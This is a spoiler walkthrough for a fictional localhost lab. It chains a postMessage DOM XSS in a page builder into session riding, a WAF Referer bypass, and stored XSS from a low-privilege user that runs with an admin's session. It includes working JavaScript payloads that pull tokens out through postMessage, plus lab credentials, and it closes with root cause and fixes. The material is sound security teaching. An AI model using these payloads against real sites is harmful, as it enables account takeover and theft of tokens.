# CampaignHub DOM XSS Lab — full walkthrough (SPOILER)

This document solves the lab end to end. It mirrors
`solve/solution_poc.html` (browser) and `solve/solve.py` (HTTP reference).

```
target      http://localhost:8080/html-builder/
attacker    http://localhost:8000
protections F5-style Referer + UA rules, HttpOnly session, role checks
```

Ready-made exploit: **`solve/solution_poc.html`**

```bash
# Must be same-site: localhost ≠ 127.0.0.1
# Easiest while the lab is up:
#   http://localhost:8000/solution_poc.html
# Or:
python3 -m http.server 8777 --directory solve
# In the browser: http://localhost:8777/solution_poc.html
```

Click **Run all** → all three flags appear in the log and badge area.
(The stage-3 preview tab is opened in the click gesture as `about:blank`,
then redirected after save — so Chrome’s popup blocker does not eat it.)

The steps below are a one-to-one replay of the scenario described in
this repository (fictional lab — not a real vendor engagement).

## Stage 1 — postMessage without origin check → flag1

1. Embed `http://localhost:8080/html-builder/` in an iframe.
   The page has no X-Frame-Options or CSP; `referrerpolicy="no-referrer"`
   also bypasses the F5-style Referer rule (no Referer is sent at all).
2. On iframe `load`, `postMessage` a message shaped like
   (`buildMessage` in `attacker/index.html`):

```js
html: '<img src=x onerror="(function(){' +
  'var k=localStorage.getItem("campaignhub_app_key");' +
  'window.parent.postMessage("PROOF|origin="+location.origin+"|key="+k,"*");' +
  '})()">'
```

3. The `containerStyles` field must stay in the message; otherwise the
   builder throws `containerStyles missing` and never renders.
4. The log line
   `PROOF|origin=http://localhost:8080|key=FLAG{...}` proves the payload
   ran in the target origin. The `campaignhub_app_key` marker is also visible
   inside the iframe.

Tip: if you drop `containerStyles` you can get stuck on “why does nothing
happen” for a long time — the original retest notes called this out too.

## Stage 2 — session riding → flag2

1. In the **same** browser profile, log in at `http://localhost:8080/login`
   as `admin / Admin!2024` (HttpOnly `panel_sid` cookie is set).
2. Open `http://localhost:8000` (the iframe is already wired up).
3. Widen the payload:

```js
html: '<img src=x onerror="(function(){' +
  'fetch("/panel/v2/campaigns",{credentials:"include"})' +
  '.then(r=>r.json())' +
  '.then(j=>window.parent.postMessage("PROOF|origin="+location.origin' +
  '+ "|token="+j.export_token,"*"));' +
  '})()">'
```

4. Response: `PROOF|...|token=FLAG{session_riding_via_dom_xss}`.
   The cookie is HttpOnly so `document.cookie` cannot read it — and you
   do not need to: requests leave from the panel origin, so the browser
   attaches the cookie automatically.

Logging in as `viewer` returns 403 on `/panel/v2/campaigns`; flag2 needs
the admin session. That role boundary is intentional.

## Stage 3 — stored XSS → flag3

> **Provenance note:** In the scenario write-up this path was a
> *code-derived hypothesis* (widget save → later render without
> sanitization) — an **unverified hypothesis** that could **not** be
> confirmed end-to-end (it needed an authenticated account with an
> active application). This lab makes it runnable so you can experience
> the full low-priv → admin chain. Treat it as an educational
> reconstruction, not a claim about any real product.

Stored XSS differs from stages 1–2: the victim does **not** open an
attacker page. A **low-privileged** user stores HTML on the panel; when
an **admin** opens the widget preview in a normal tab, the script runs
in the panel origin with the admin session.

1. Log in as **`viewer` / `viewer123`** (low privilege).
   Open `http://localhost:8080/html-builder/` (black log: `[init] builder ready…`).
   The builder UI has no “send message” field — inject the view from
   **DevTools Console** on that page:

```js
window.dispatchEvent(new MessageEvent('message', {
  origin: 'http://localhost:8000',
  data: {
    type: 'NTM_HTML_BUILDER',
    initial: true,
    view: {
      index: 0,
      name: 'stage3',
      html: `<img src=x onerror="(function(){
        fetch('/panel/v2/audit/log',{credentials:'include'})
          .then(r=>r.json())
          .then(j=>console.log('PROOF3|token='+j.integrity_token));
      })()">`,
      extJsUrls: [], extCssUrl: [], elements: [], initial: true,
      containerStyles: {
        width: '320px', backgroundColor: '#fff',
        border: '1px solid red', borderRadius: '5px'
      }
    },
    widgetType: 'FLOATING_BAR',
    platform: 'WEB'
  }
}));
```

   Builder black log should show `[recv] … name=stage3` and
   `[ok] view rendered`. Click **Save**.

   `POST /panel/widget/save` stores the canvas HTML as-is
   (same as the original `widget/save` finding — no sanitization).
   Viewer is enough; the server does not restrict who may save.

2. In the **same** profile, log in as **`admin` / `Admin!2024`**
   (replaces `panel_sid`; preview will ride the admin session).

3. Open in a **new tab** — not from the attacker page:

   `http://localhost:8080/panel/widget/preview?id=w1`

   The same `createContextualFragment` sink runs on that page;
   the payload calls `audit/log` with the admin cookie →
   `PROOF3|token=FLAG{stored_xss_widget_preview}` (preview tab console).

4. Why this matters: with the attacker page closed, only a visit to the
   panel preview URL was enough. Role split is intentional: low-priv
   writes, high-priv executes.

Extra note: the preview page is also frame-able; you can iframe it if
you want — but the lesson is “a stored payload runs without the
attacker page”.

## Why the WAF is not enough

| Control | Bypass |
|---------|--------|
| Referer origin ≠ panel origin → 403 (incl. `http://localhost:8000`) | `referrerpolicy="no-referrer"` (no Referer header → rule never fires) |
| HttpOnly session cookie | No need to read it; `credentials:'include'` is enough |
| UI interaction (CVSS UI:R) | Only that the victim opens the attacker page — no extra click |

## Root cause (for the remediation discussion)

The `message` handler never compares `event.origin`; `view.html` is
written straight into the DOM via `range.createContextualFragment`.
Fix: origin allow-list + HTML sanitization (or move the builder into a
sandboxed `srcdoc` iframe).
